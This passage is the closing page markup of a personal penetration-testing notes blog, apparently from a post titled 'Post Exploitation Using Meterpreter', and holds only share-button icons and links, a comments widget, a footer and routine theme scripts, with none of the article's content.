179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on telegram" href="https://telegram.me/share/url?text=Post%20Exploitation%20Using%20Meterpreter&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Post Exploitation Using Meterpreter on ycombinator" href="https://news.ycombinator.com/submitlink?t=Post%20Exploitation%20Using%20Meterpreter&u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f02-post-exploitation-using-meterpreter%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer><script src=https://giscus.app/client.js data-repo=0x-s0M3n4th/0x-s0M3n4th.github.io data-repo-id=R_kgDOPV2wYg data-category=General data-category-id=DIC_kwDOPV2wYs4C1aSa data-mapping=url data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous async></script></article></main><footer class=footer><span>&copy; 2026 <a href=https://0x-s0M3n4th.github.io/>0x-s0M3n4th's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>